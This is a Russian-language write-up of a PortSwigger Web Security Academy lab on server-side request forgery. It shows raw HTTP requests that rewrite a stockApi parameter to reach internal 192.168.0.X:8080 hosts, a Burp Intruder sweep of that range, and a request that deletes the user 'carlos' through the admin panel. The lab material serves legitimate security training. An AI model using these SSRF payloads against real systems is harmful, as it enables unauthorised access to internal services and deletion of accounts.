---
title: "Basic SSRF against another back-end system"
date: 2025-07-22
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/ssrf-apprentice/ssrf/lab-basic-ssrf-against-backend-system"
classes: wide
---

Эта лаба содержит уязвимость **SSRF** (Server-side request forgery).

Для прохождения лабы нам нужно найти `ip`-адрес бекенд сервиса, на котором расположена панель администратора `/admin` на порту `8080`, а затем удалить пользователя `carlos`.

Мы знаем, что адрес сервиса начинается с `192.168.0.X` и располагается на порту `8080`.

```
https://0a8c001c03be57138111448800b200f6.web-security-academy.net/
```

## Solution

```http
POST /product/stock HTTP/2
Host: 0a8c001c03be57138111448800b200f6.web-security-academy.net
Cookie: session=AiSe3EMbwjlxeqc4evXRCR4B3leJ8qOA
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8c001c03be57138111448800b200f6.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: https://0a8c001c03be57138111448800b200f6.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
```

Подставим предполагаемый адрес в параметр `stockApi`:

```http
POST /product/stock HTTP/2
Host: 0a8c001c03be57138111448800b200f6.web-security-academy.net
Cookie: session=AiSe3EMbwjlxeqc4evXRCR4B3leJ8qOA
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8c001c03be57138111448800b200f6.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: https://0a8c001c03be57138111448800b200f6.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

stockApi=http://192.168.0.1:8080/admin
```

Получили ответ:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 19

"Missing parameter"
```

Теперь нужно перебрать значения от `2` до `255`, пока не получим код `200`. Для этого можно использовать `Intruder` в `Burp Suite`.

Перебором `ip` адресов я нашел, что нужный нам — это `192.168.0.53`. Получим код страницы с админ панелью с помощью запроса на адрес `http://192.168.0.53:8080/admin`:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_ssrf/IMG_Basic_SSRF_against_another_back-end_system/1.png){: height="200" .align-center}

Для удаления пользователя отправим запроса на адрес `http://192.168.0.53:8080/admin/delete?username=carlos` и затем проверим ответ:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_ssrf/IMG_Basic_SSRF_against_another_back-end_system/2.png){: height="200" .align-center}